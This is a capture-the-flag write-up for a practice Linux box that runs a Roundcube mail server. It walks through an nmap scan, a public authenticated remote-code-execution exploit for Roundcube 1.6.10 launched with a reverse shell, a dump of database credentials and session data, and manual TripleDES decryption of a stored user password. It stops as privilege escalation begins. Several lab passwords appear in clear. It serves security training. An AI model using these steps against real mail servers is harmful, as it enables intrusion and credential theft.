### Active Linux Easy Box

## Writeup

# Enumeration

Initial Nmap Scan

```bash
# Nmap 7.94SVN scan initiated Sun Jul 20 04:23:26 2025 as: nmap -sCV -oN nmap.txt -vv 10.10.11.77
Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 63 (0.011s latency).
Scanned at 2025-07-20 04:23:26 CDT for 7s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 20 04:23:33 2025 -- 1 IP address (1 host up) scanned in 7.09 seconds
```

We are in a breached scenario and starting with credentials

tyler:LhKL1o9Nm3X2

Checking the website we see - 
redirect to http://mail.outbound.htb/

Addding to the hosts file,

visiting the website we see a RoundCube mail server, testing credentials for tyler

we can login. Looking for exploits for RoundCube mail v1.6.10 

Found an authenticated RCE exploit - https://github.com/hakaioffsec/CVE-2025-49113-exploit

Testing Exploit, creating a bash reverse shell and hosting it on a webserver

<img width="1041" height="319" alt="image" src="https://github.com/user-attachments/assets/44d54f27-9120-40a2-998f-c8378ee59878" />

Exploit is successful, We have initial foothold on the machine as www-data

Getting a stable shell using -

```
Victim$~ script -qc bash /dev/null
Victim$~ Ctrl+z

Attacker$~ stty raw -echo;fg
```

Now that we have a stable shell we can check if we can su to tyler using the same pw.

Success, we are tyler on the box

Running LinPeas - Interesting finds

1. $config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube
2. we are in a docker

Next lets see if we find anything interesting in the db

We found hashed creds for 3 users and some session info which is b64 encoded

```bash
MariaDB [roundcube]> select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+                       
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |                       
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+                       
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |                       
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |                       
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-20 09:37:25 | 2025-07-20 09:26:23 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |                       
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+

MariaDB [roundcube]> select * from session;

<SNIP>
bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI
7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY2
9uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yY
WdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6
MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk
5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW
5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZ
W1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2Nh
dGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24
iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbG
wtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0O
iJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31T
VE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6Iml
kIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcm
lhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtb
GFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xk
ZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
</SNIP>

```

decoding the b64 we see jacobs login info, lets try to figure out how we can crack this

Researching online we find that RoundCube uses TripleDES encryption and we can find the encryption key in the config.inc.php file, checking online to see if we find a password cracker.

No pw cracker found, but we can crack this hash manually on CyberChef

first convert the pw from b64 to hex, grab the first 8 bytes, this will be the IV - initialization vector,
we already have the DES key from the config file, and we will input the remaining bytes of the hex in the TripleDES decrypt function to crack

hex - 2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf
                                                                                                                                                                                                                 To summarize, Triple DESC Decrypt on CyberChef

INPUTS -
Key - rcmail-!24ByteDESkey*Str | UTF8
IV - 2f b4 6f d3 40 3c 4e ec | HEX
Input - 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf
                                                                                                                                                                                                                 Password - 595mO8DmwGeD
It gives us a string - 595mO8DmwGeD

Lets try to see if this was jacobs pw

ityler@mail:/var/www/html/roundcube/config$ su jacob
Password: 595mO8DmwGeD
jacob@mail:/var/www/html/roundcube/config$ id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
jacob@mail:/var/www/html/roundcube/config

Success, we are now user jacob

but we are still in a container, we need some way to escape this, but first lets check jacobs home dir We find emails and a password - gY4Wr3a1evp4

Testing SSH 

```bash
┌─[captainjack09☺htb-wktvn1yxgc]─[~/my_data/machines/outbound/www]
└──╼ $nxc ssh outbound.htb -u jacob -p gY4Wr3a1evp4
SSH         10.10.11.77     22     outbound.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.10.11.77     22     outbound.htb     [+] jacob:gY4Wr3a1evp4  Linux - Shell access!
```

Lets SSH and see if we can escalate

### Privilege escalation

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Lets find out what this below command is

